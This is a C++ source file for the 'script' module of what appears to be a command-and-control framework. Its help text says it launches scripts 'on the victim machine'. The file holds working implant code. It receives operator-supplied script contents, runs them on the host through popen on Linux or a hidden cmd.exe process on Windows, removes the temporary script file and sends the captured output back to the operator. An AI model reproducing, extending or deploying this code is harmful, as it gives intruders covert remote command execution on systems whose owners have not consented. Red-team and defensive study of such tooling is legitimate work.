#include "Script.hpp"

#include <array>
#include <chrono>
#include <cctype>
#include <cstring>
#include <filesystem>
#include <fstream>
#include <sstream>
#include <string>
#include <thread>

#include "Common.hpp"

#ifdef _WIN32
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#endif

using namespace std;


constexpr std::string_view moduleName = "script";
constexpr unsigned long long moduleHash = djb2(moduleName);


#ifdef _WIN32

__declspec(dllexport) Script* ScriptConstructor() 
{
    return new Script();
}

#else

__attribute__((visibility("default"))) Script * ScriptConstructor()
{
    return new Script();
}

#endif

namespace
{
#ifdef _WIN32
    bool hasWindowsScriptExtension(const std::string& path)
    {
        std::string extension = std::filesystem::path(path).extension().string();
        for (char& c : extension)
        {
            c = static_cast<char>(std::tolower(static_cast<unsigned char>(c)));
        }
        return extension == ".bat" || extension == ".cmd";
    }

    std::string makeWindowsTempScriptPath(const std::string& inputFile)
    {
        char tempPathBuffer[MAX_PATH + 1] = {};
        DWORD tempPathLength = GetTempPathA(MAX_PATH, tempPathBuffer);
        if (tempPathLength == 0 || tempPathLength > MAX_PATH)
        {
            return {};
        }

        const std::string extension = std::filesystem::path(inputFile).extension().string();
        std::ostringstream name;
        name << "c2core_script_" << GetCurrentProcessId() << "_"
             << std::chrono::steady_clock::now().time_since_epoch().count()
             << "_"
             << std::hash<std::thread::id>{}(std::this_thread::get_id())
             << extension;

        std::filesystem::path tempPath(tempPathBuffer);
        tempPath /= name.str();
        return tempPath.string();
    }

    std::string runWindowsScriptFile(const std::string& scriptPath)
    {
        std::string result;

        SECURITY_ATTRIBUTES securityAttributes;
        securityAttributes.nLength = sizeof(SECURITY_ATTRIBUTES);
        securityAttributes.bInheritHandle = TRUE;
        securityAttributes.lpSecurityDescriptor = nullptr;

        HANDLE pipeRead = nullptr;
        HANDLE pipeWrite = nullptr;
        if (!CreatePipe(&pipeRead, &pipeWrite, &securityAttributes, 0))
        {
            return "CreatePipe failed.";
        }
        if (!SetHandleInformation(pipeRead, HANDLE_FLAG_INHERIT, 0))
        {
            CloseHandle(pipeRead);
            CloseHandle(pipeWrite);
            return "SetHandleInformation failed.";
        }

        STARTUPINFOA startupInfo;
        ZeroMemory(&startupInfo, sizeof(startupInfo));
        startupInfo.cb = sizeof(startupInfo);
        startupInfo.dwFlags = STARTF_USESTDHANDLES;
        startupInfo.hStdOutput = pipeWrite;
        startupInfo.hStdError = pipeWrite;
        startupInfo.hStdInput = GetStdHandle(STD_INPUT_HANDLE);

        PROCESS_INFORMATION processInfo;
        ZeroMemory(&processInfo, sizeof(processInfo));

        char comspecBuffer[MAX_PATH + 1] = {};
        DWORD comspecLength = GetEnvironmentVariableA("ComSpec", comspecBuffer, MAX_PATH);
        std::string comspec = (comspecLength > 0 && comspecLength <= MAX_PATH)
            ? std::string(comspecBuffer, comspecLength)
            : "C:\\Windows\\System32\\cmd.exe";

        std::string commandLine = "\"" + comspec + "\" /Q /C \"\"" + scriptPath + "\"\"";
        std::vector<char> mutableCommandLine(commandLine.begin(), commandLine.end());
        mutableCommandLine.push_back('\0');

        BOOL created = CreateProcessA(
            nullptr,
            mutableCommandLine.data(),
            nullptr,
            nullptr,
            TRUE,
            CREATE_NO_WINDOW,
            nullptr,
            nullptr,
            &startupInfo,
            &processInfo);

        CloseHandle(pipeWrite);

        if (!created)
        {
            CloseHandle(pipeRead);
            return "CreateProcess failed.";
        }

        std::array<char, 4096> buffer{};
        DWORD bytesRead = 0;
        while (ReadFile(pipeRead, buffer.data(), static_cast<DWORD>(buffer.size()), &bytesRead, nullptr) && bytesRead > 0)
        {
            result.append(buffer.data(), bytesRead);
        }

        WaitForSingleObject(processInfo.hProcess, INFINITE);
        CloseHandle(processInfo.hThread);
        CloseHandle(processInfo.hProcess);
        CloseHandle(pipeRead);

        return result;
    }
#endif
}


Script::Script()
#ifdef BUILD_TEAMSERVER
    : ModuleCmd(std::string(moduleName), moduleHash)
#else
    : ModuleCmd("", moduleHash)
#endif
{
}

Script::~Script()
{
}

std::string Script::getInfo()
{
    std::string info;
#ifdef BUILD_TEAMSERVER
    info += "script:\n";
    info += "Launch the script on the victim machine\n";
    info += "exemple:\n";
    info += " - script /tmp/toto.sh\n";
#endif
    return info;
}


int Script::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
{
#if defined(BUILD_TEAMSERVER) || defined(C2CORE_BUILD_TESTS)
    if(splitedCmd.size()<2)
    {
        c2Message.set_returnvalue(getInfo());
        return -1;
    }

    string inputFile = splitedCmd[1];

    std::ifstream input(inputFile, std::ios::binary);

    if(input.good())
    {
        std::string buffer(std::istreambuf_iterator<char>(input), {});

        c2Message.set_instruction(splitedCmd[0]);
        c2Message.set_inputfile(inputFile);
        c2Message.set_data(buffer.data(), buffer.size());
    }
    else
    {
        std::string err = "[-] Fail to open file: ";
        err+=inputFile;
        c2Message.set_returnvalue(err);
        return -1;
    }
#endif

    return 0;
}


int Script::process(C2Message &c2Message, C2Message &c2RetMessage)
{
    const std::string script = c2Message.data();

    std::string result;

#ifdef __linux__ 

    std::array<char, 128> buffer;

    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(script.c_str(), "r"), pclose);
    if (!pipe)
    {
        throw std::runtime_error("popen() filed!");
    }
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr)
    {
        result += buffer.data();
    }

#elif _WIN32

    if (!hasWindowsScriptExtension(c2Message.inputfile()))
    {
        result = "Unsupported script type on Windows. Use .bat or .cmd.";
    }
    else
    {
        const std::string tempScriptPath = makeWindowsTempScriptPath(c2Message.inputfile());
        if (tempScriptPath.empty())
        {
            result = "Failed to create temporary script path.";
        }
        else
        {
            {
                std::ofstream tempScript(tempScriptPath, std::ios::binary);
                tempScript.write(script.data(), static_cast<std::streamsize>(script.size()));
            }

            if (!std::filesystem::exists(tempScriptPath))
            {
                result = "Failed to write temporary script.";
            }
            else
            {
                result = runWindowsScriptFile(tempScriptPath);
                std::error_code ignored;
                std::filesystem::remove(tempScriptPath, ignored);
            }
        }
    }

#endif

    c2RetMessage.set_instruction(c2Message.instruction());
    c2RetMessage.set_returnvalue(result);

    return 0;
}
